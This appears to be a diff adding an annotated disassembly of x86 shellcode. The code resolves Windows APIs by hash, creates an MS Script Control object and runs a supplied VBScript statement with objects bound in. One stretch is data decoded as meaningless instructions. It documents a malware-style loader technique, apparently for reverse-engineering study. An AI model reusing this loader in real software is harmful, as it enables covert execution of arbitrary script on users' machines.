@@ -1,0 +1,328 @@
+push ebp
+mov ebp, esp
+sub esp, 0xD4
+push ebx
+mov ebx, [ebp+0x8]
+xorps xmm0, xmm0
+push esi
+push edi
+xor eax, eax
+mov dword ptr [ebp-0x24], 0x61656C6F
+mov [ebp-0x60], ax
+xor edx, edx
+mov eax, [ebx+0x10]
+xor esi, esi
+push 0x711228C1
+push ebx
+mov [ebp-0x4], esi
+movups [ebp-0x94], xmm0
+mov dword ptr [ebp-0x20], 0x32337475
+movups [ebp-0x84], xmm0
+mov dword ptr [ebp-0x1C], 0x6C6C642E
+movups [ebp-0xD4], xmm0
+mov byte ptr [ebp-0x18], 0x0
+movups [ebp-0xC4], xmm0
+mov dword ptr [ebp-0x70], 0x420056
+movups [ebp-0xB4], xmm0
+mov dword ptr [ebp-0x6C], 0x630053
+movups [ebp-0xA4], xmm0
+mov dword ptr [ebp-0x68], 0x690072
+mov dword ptr [ebp-0x64], 0x740070
+mov dword ptr [ebp-0x4C], 0xE59F1D3
+mov dword ptr [ebp-0x48], 0x11D01FBE
+mov dword ptr [ebp-0x44], 0xA000F28F
+mov dword ptr [ebp-0x40], 0xBC3800D1
+mov dword ptr [ebp-0x5C], 0xE59F1D5
+mov dword ptr [ebp-0x58], 0x11D01FBE
+mov dword ptr [ebp-0x54], 0xA000F28F
+mov dword ptr [ebp-0x50], 0xBC3800D1
+mov dword ptr [ebp-0x14], 0x6F0070
+mov dword ptr [ebp-0x10], 0x6F
+mov [ebp-0x28], edx
+mov dword ptr [ebp-0x3C], 0x72436F43
+call eax                                ;get kernel32 base
+add esp, 0x8
+test eax, eax
+jz 0x000903B9
+push 0x1
+lea ecx, [ebp-0x94]
+push ecx
+push eax
+mov eax, [ebx+0xC]
+call eax
+push 0x82F30254
+lea eax, [ebp-0x94]
+mov dword ptr [ebp-0x38], 0x65746165
+push eax
+mov eax, [ebx+0x14]
+push ebx
+call eax                               ;getProcAddress
+add esp, 0x18
+mov [ebp-0xC], eax
+test eax, eax
+jz 0x000903B9
+push 0x12F0B070
+lea eax, [ebp-0x94]
+mov dword ptr [ebp-0x34], 0x74736E49
+push eax
+mov eax, [ebx+0x14]
+push ebx
+call eax                              ;LoadLibraryA
+add esp, 0xC
+mov [ebp-0x8], eax
+test eax, eax
+jz 0x000903B9
+mov eax, [ebx+0x10]
+push 0xB109B9F8
+push ebx
+mov dword ptr [ebp-0x30], 0x65636E61
+call eax                            ; ole32.dll base
+mov edi, eax
+add esp, 0x8
+test edi, edi
+jz 0x000903B9
+push 0x1
+lea eax, [ebp-0xD4]
+push eax
+mov eax, [ebx+0xC]
+push edi
+call eax
+lea eax, [ebp-0x3C]
+mov byte ptr [ebp-0x2C], 0x0
+push eax
+push edi
+call [ebp-0xC]                     ;ole32.CoCreateInstance
+add esp, 0x14
+mov [ebp-0xC], eax
+test eax, eax
+jz 0x000903B9
+lea eax, [ebp-0x24]
+push eax
+call [ebp-0x8]                   ;oleaut32.dll
+add esp, 0x4
+test eax, eax
+jz 0x000903B9
+push 0x1
+lea ecx, [ebp-0xB4]
+push ecx
+push eax
+mov eax, [ebx+0xC]
+call eax
+push 0xC1922EAC
+lea eax, [ebp-0xB4]
+push eax
+mov eax, [ebx+0x14]
+push ebx
+call eax                    ;oleout32.SysAllocString
+add esp, 0x18
+mov [ebp-0x74], eax
+test eax, eax
+jz 0x000903B9
+push 0x65016240
+lea eax, [ebp-0xB4]
+push eax
+mov eax, [ebx+0x14]
+push ebx
+call eax                   ;oleout32.SysFreeString
+mov edi, eax
+add esp, 0xC
+mov [ebp-0x8], edi
+test edi, edi
+jz 0x000903B9
+lea eax, [ebp-0x4]
+push eax
+lea eax, [ebp-0x4C]
+push eax
+push 0x1
+lea eax, [ebp-0x5C]
+push esi
+push eax
+call [ebp-0xC]        ;ole32.CoCreateInstance(??)
+mov esi, eax
+add esp, 0x14
+cmp esi, 0x746E6948
+jnz 0x0009025C
+dec ecx
+and [ecx+0x20], cl
+jnbe 0x00090277
+jb 0x00090279
+and [edi+ebp*2+0x20], dh
+jz 0x00090283
+jz 0x00090288
+and gs:[eax+ebp*2+0x69], dh
+jnb 0x00090243
+jo 0x0009028E
+arpl gs:[ebp+0x2C], sp
+and [ecx+0x74], ch
+and [edi+0x6F], dh
+jnz 0x0009029D
+and fs:[edx+0x65], ah
+and [edi], ah
+inc ecx
+pop edi
+inc esi
+dec esp
+inc ecx
+push edx
+inc ebp
+pop edi
+xor [edx+0x5F], dh
+jz 0x000902AD
+xor ebx, [edi+0x44]
+jb 0x0009027E
+insd
+xor al, 0x74
+xor [eax], ebp
+inc ebx
+sub [edi], esp
+or eax, 0x85D8B0A
+mov edi, [ebp-0x8]
+jmp 0x00090264
+test esi, esi
+js 0x000903B9
+mov esi, [ebp-0x74]
+lea eax, [ebp-0x70]
+push eax
+call esi   ;SysAllocString("VBScript")
+add esp, 0x4
+mov [ebp-0x8], eax
+test eax, eax
+jnz 0x00090285
+mov esi, 0x8007000E
+mov eax, esi
+pop edi
+pop esi
+pop ebx
+mov esp, ebp
+pop ebp
+ret
+lea eax, [ebp-0x14]
+push eax
+call esi ;SysAllocString("poo")
+add esp, 0x4
+mov [ebp-0xC], eax
+test eax, eax
+jnz 0x000902A1
+mov esi, 0x8007000E
+xor ebx, ebx
+jmp 0x0009038D
+mov eax, 0x68
+mov dword ptr [ebp-0x14], 0x53006F
+mov [ebp-0x10], ax
+lea eax, [ebp-0x14]
+push eax
+call esi ;SysAllocString("oSh")
+add esp, 0x4
+mov [ebp-0x28], eax
+test eax, eax
+jnz 0x000902CD
+mov esi, 0x8007000E
+xor ebx, ebx
+jmp 0x0009038D
+mov eax, 0x6F
+mov dword ptr [ebp-0x14], 0x730066
+mov [ebp-0x10], ax
+lea eax, [ebp-0x14]
+push eax
+call esi ;SysAllocString("fso")
+add esp, 0x4
+mov [ebp+0x8], eax
+test eax, eax
+jnz 0x000902F9
+mov esi, 0x8007000E
+mov ebx, eax
+jmp 0x0009038D
+mov eax, [ebp-0x4]
+push [ebp-0x8]
+push eax
+mov ecx, [eax]
+mov eax, [ecx+0x20]
+call eax ;msscript.CScriptControl::put_Language
+mov esi, eax
+test esi, esi
+js 0x0009038A
+mov eax, [ebp-0x4]
+push 0xFFFFFFFF
+push eax
+mov ecx, [eax]
+mov eax, [ecx+0x38]
+call eax ;msscript.CScriptControl::put_Timeout
+mov esi, eax
+test esi, esi
+js 0x0009038A
+mov eax, [ebp-0x4]
+push 0xFFFFFFFF
+push [ebx+0x1C]
+mov ecx, [eax]
+push [ebp-0xC]
+push eax
+mov eax, [ecx+0x60]
+call eax ;msscript.CScriptControl::AddObject("poo", ????)
+mov esi, eax
+test esi, esi
+js 0x0009038A
+mov eax, [ebp-0x4]
+mov edx, [ebp-0x28]
+push 0xFFFFFFFF
+push [ebx+0x1C]
+mov ecx, [eax]
+push edx
+push eax
+mov eax, [ecx+0x60]
+call eax ;msscript.CScriptControl::AddObject("oSh", ????)
+mov esi, eax
+test esi, esi
+js 0x0009038A
+mov eax, [ebp-0x4]
+push 0xFFFFFFFF
+push [ebx+0x1C]
+mov ebx, [ebp+0x8]
+mov ecx, [eax]
+push ebx
+push eax
+mov eax, [ecx+0x60]
+call eax ;msscript.CScriptControl::AddObject("fso", ????)
+mov esi, eax
+test esi, esi
+js 0x0009038D
+mov eax, [ebp-0x4]
+push [ebp+0xC]
+push eax
+mov ecx, [eax]
+mov eax, [ecx+0x70]
+call eax ;msscript.CScriptControl::ExecuteStatement("=code=")
+mov esi, eax
+mov eax, [ebp-0x4]
+push eax
+mov ecx, [eax]
+mov eax, [ecx+0x8]
+call eax ;msscript.CScriptControl::Release()
+jmp 0x0009038D
+mov ebx, [ebp+0x8]
+push [ebp-0x8]
+call edi ;oleaut32.SysFreeString("fso")
+mov eax, [ebp-0xC]
+add esp, 0x4
+test eax, eax
+jz 0x000903A2
+push eax 
+call edi ;oleaut32.SysFreeString("poo")
+add esp, 0x4
+mov eax, [ebp-0x28]
+test eax, eax
+jz 0x000903AF
+push eax
+call edi ;oleaut32.SysFreeString("oSh")
+add esp, 0x4
+test ebx, ebx
+jz 0x000903B9
+push ebx
+call edi
+add esp, 0x4
+pop edi
+mov eax, esi
+pop esi
+pop ebx
+mov esp, ebp
+pop ebp
+ret
